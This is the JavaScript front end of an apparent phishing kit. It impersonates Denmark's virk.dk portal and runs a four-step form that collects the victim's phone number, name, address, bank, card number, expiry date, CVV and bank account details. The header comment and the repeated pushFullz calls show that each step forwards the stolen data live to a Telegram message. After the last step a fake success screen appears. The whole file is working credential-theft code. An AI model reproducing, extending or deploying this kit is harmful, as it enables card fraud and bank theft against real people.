/* details.js — 4-step bank/card/personal funnel.
   Each step updates the SAME Telegram message live (pushFullz). */

loadState();

const stepContent = document.getElementById('stepContent');
let step = 1;

function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

function updateTracker(s){
  for(let i=1;i<=4;i++){
    const dot=document.getElementById('sDot'+i);
    const bub=document.getElementById('sBub'+i);
    dot.classList.remove('active','done');
    if(i<s){ dot.classList.add('done'); bub.innerHTML='✓'; }
    else if(i===s){ dot.classList.add('active'); bub.textContent=i; }
    else bub.textContent=i;
  }
}

function renderStep(s){
  step=s; updateTracker(s);
  stepContent.innerHTML = getHead(s) + getForm(s);
  attach(s);
}

function getHead(s){
  const h = {
    1:'<div class="details-head"><h1>Bekræft telefon</h1><p>Indtast dit telefonnummer for at fortsætte.</p></div>',
    2:'<div class="details-head"><h1>Dine oplysninger</h1><p>Udfyld dine personlige oplysninger nedenfor.</p></div>',
    3:'<div class="details-head"><h1>Kortoplysninger</h1><p>Indtast dine kortoplysninger til verifikation.</p></div>',
    4:'<div class="details-head"><h1>Bankkonto</h1><p>Indtast dine kontooplysninger.</p></div>'
  };
  return h[s]||'';
}

function getForm(s){
  const d = state.data;
  switch(s){
    case 1: return '<form class="dform" onsubmit="return false"><div class="dfield"><label>Telefonnummer (+45)</label><input type="tel" id="phoneInput" placeholder="12 34 56 78" maxlength="11" value="'+esc(d.phoneNumber)+'"></div><button class="dbtn" id="stepBtn" disabled>Fortsæt</button><p class="dinfo">Dette er en regelmæssig opdateringsproces for en sikker oplevelse hos virk.dk.</p></form>';
    case 2: return '<form class="dform" onsubmit="return false"><div class="dfield dfull"><label>Fulde Navn</label><input type="text" id="navnInput" placeholder="Ola Nordmann" value="'+esc(d.navn)+'"></div><div class="dfield dfull"><label>Adresse</label><input type="text" id="addressInput" placeholder="Eksempelgade 1" value="'+esc(d.address)+'"></div><div class="dgrid"><div class="dfield"><label>Postnummer</label><input type="text" id="postnummerInput" placeholder="1234" value="'+esc(d.postnummer)+'" maxlength="4"></div><div class="dfield"><label>By</label><input type="text" id="byInput" placeholder="København" value="'+esc(d.by)+'"></div></div><div class="dfield dfull"><label>Vælg Bank</label><select id="bankSelect"><option value="" disabled'+(d.selectedBank?'':' selected')+'>Vælg din bank</option>'+BANKS.map(function(b){return '<option value="'+esc(b)+'"'+(d.selectedBank===b?' selected':'')+'>'+esc(b)+'</option>';}).join('')+'</select></div><button class="dbtn" id="stepBtn">Opdater oplysninger</button></form>';
    case 3: return '<div class="card-preview-wrap"><div class="card-preview"><div class="card-inner" id="cardInner"><div class="card-front"><div class="card-chip"></div><div class="card-brand"><span>VIRK</span></div><div class="card-number" id="cardNumberPreview">•••• •••• •••• ••••</div><div class="card-meta"><div class="card-holder"><label>Kortindehaver</label><span id="cardHolderPreview">DIT NAVN</span></div><div class="card-exp"><label>Udløber</label><span id="cardExpPreview">MM/ÅÅ</span></div></div></div><div class="card-back"><div class="card-stripe"></div><div class="card-cvv"><label>CVV</label><span id="cardCvvPreview">•••</span></div></div></div></div></div><form class="dform" onsubmit="return false"><div class="dfield dfull"><label>Kortindehaver</label><input type="text" id="kortnavnInput" placeholder="OLA NORDMANN" value="'+esc(d.kortnavn)+'"></div><div class="dfield dfull"><label>Kortnummer</label><input type="text" id="kortnummerInput" placeholder="1234 5678 9012 3456" value="'+esc(d.kortnummer)+'" maxlength="19"></div><div class="dgrid"><div class="dfield"><label>Udløbsdato</label><input type="text" id="expiryInput" placeholder="MM/ÅÅ" value="'+esc(d.expiry)+'" maxlength="5"></div><div class="dfield"><label>CVV</label><input type="text" id="cvvInput" placeholder="123" value="'+esc(d.cvv)+'" maxlength="4"></div></div><button class="dbtn" id="stepBtn">Bekræft kort</button><p class="dinfo">Dine kortoplysninger krypteres og opbevares sikkert.</p></form>';
    case 4: return '<form class="dform" onsubmit="return false"><div class="dgrid"><div class="dfield"><label>Reg. Nr.</label><input type="text" id="regNrInput" placeholder="1234" value="'+esc(d.regNr)+'" maxlength="4"></div><div class="dfield"><label>Konto Nr.</label><input type="text" id="kontoNrInput" placeholder="1234567" value="'+esc(d.kontoNr)+'" maxlength="10"></div></div><button class="dbtn" id="stepBtn">Gennemfør</button><p class="dinfo">Din konto tilknyttes din virk.dk-profil.</p></form>';
  }
  return '';
}

function attach(s){
  if(s===1){
    const inp=document.getElementById('phoneInput'),btn=document.getElementById('stepBtn');
    if(state.data.phoneNumber && state.data.phoneNumber.length>=8) btn.disabled=false;
    inp.addEventListener('input',function(){
      let d=this.value.replace(/\D/g,'').slice(0,8);
      d=d.replace(/(.{2})(?=.)/g,'$1 ').trim();
      this.value=d; state.data.phoneNumber=d.replace(/\s/g,''); saveState();
      btn.disabled = state.data.phoneNumber.length<8;
    });
    btn.addEventListener('click',function(){
      if(state.data.phoneNumber && state.data.phoneNumber.length>=8){ pushFullz(); renderStep(2); }
    });
  }
  if(s===2){
    const btn=document.getElementById('stepBtn');
    ['navn','address','postnummer','by'].forEach(function(k){
      const el=document.getElementById(k+'Input');
      if(el) el.addEventListener('input',function(){ state.data[k]=this.value; saveState(); });
    });
    const pi=document.getElementById('postnummerInput');
    if(pi) pi.addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,4); });
    const sel=document.getElementById('bankSelect');
    if(sel) sel.addEventListener('change',function(){ state.data.selectedBank=this.value; saveState(); });
    btn.addEventListener('click',function(){
      ['navn','address','postnummer','by'].forEach(function(k){ const e=document.getElementById(k+'Input'); if(e) state.data[k]=e.value; });
      if(sel) state.data.selectedBank=sel.value;
      saveState(); pushFullz(); renderStep(3);
    });
  }
  if(s===3){
    const btn=document.getElementById('stepBtn');
    ['kortnavn','kortnummer','expiry','cvv'].forEach(function(k){
      const el=document.getElementById(k+'Input');
      if(el) el.addEventListener('input',function(){ state.data[k]=this.value; saveState(); });
    });
    const num=document.getElementById('kortnummerInput');
    if(num) num.addEventListener('input',function(){
      let raw=this.value.replace(/\D/g,'').slice(0,16);
      this.value=raw.replace(/(.{4})(?=.)/g,'$1 ').trim();
      updateCardPreview();
    });
    const exp=document.getElementById('expiryInput');
    if(exp) exp.addEventListener('input',function(){ let d=this.value.replace(/\D/g,'').slice(0,4); this.value=d.length>2?d.slice(0,2)+'/'+d.slice(2):d; updateCardPreview(); });
    const cvv=document.getElementById('cvvInput');
    if(cvv) cvv.addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,4); updateCardPreview(); });
    if(cvv) cvv.addEventListener('focus',function(){ document.getElementById('cardInner').classList.add('flipped'); });
    if(cvv) cvv.addEventListener('blur',function(){ document.getElementById('cardInner').classList.remove('flipped'); });
    const navn=document.getElementById('kortnavnInput');
    if(navn) navn.addEventListener('input',function(){ updateCardPreview(); });

    function updateCardPreview(){
      const n=document.getElementById('kortnummerInput');
      const cn=n?n.value.replace(/\D/g,'') : '';
      const fmt = cn.length ? cn.replace(/(.{4})(?=.)/g,'$1 ') : '•••• •••• •••• ••••';
      document.getElementById('cardNumberPreview').textContent = fmt || '•••• •••• •••• ••••';
      const h=document.getElementById('kortnavnInput');
      document.getElementById('cardHolderPreview').textContent = (h&&h.value.trim()?h.value.trim().toUpperCase():'DIT NAVN');
      const e=document.getElementById('expiryInput');
      document.getElementById('cardExpPreview').textContent = (e&&e.value?e.value:'MM/ÅÅ');
      const c=document.getElementById('cvvInput');
      document.getElementById('cardCvvPreview').textContent = (c&&c.value?c.value:'•••');
    }

    btn.addEventListener('click',function(){
      ['kortnavn','kortnummer','expiry','cvv'].forEach(function(k){ const e=document.getElementById(k+'Input'); if(e) state.data[k]=e.value; });
      saveState(); pushFullz(); renderStep(4);
    });
    updateCardPreview();
  }
  if(s===4){
    const btn=document.getElementById('stepBtn');
    ['regNr','kontoNr'].forEach(function(k){
      const el=document.getElementById(k+'Input');
      if(el) el.addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0, k==='regNr'?4:10); state.data[k]=this.value; saveState(); });
    });
    btn.addEventListener('click',function(){
      ['regNr','kontoNr'].forEach(function(k){ const e=document.getElementById(k+'Input'); if(e) state.data[k]=e.value; });
      saveState(); pushFullz();
      showSuccess();
    });
  }
}

function showSuccess(){
  stepContent.innerHTML = '<div class="success-box"><div class="success-check">✓</div><h1 style="font-size:26px;font-weight:700;color:#001C44;margin-bottom:10px">Opdatering gennemført</h1><p style="color:#555;font-size:14px;line-height:1.6">Dine oplysninger er blevet opdateret. Du kan lukke vinduet.</p><button class="dbtn" style="margin-top:20px" onclick="location.href=CONFIG.REDIRECT_URL">Log ud</button></div>';
}

renderStep(1);
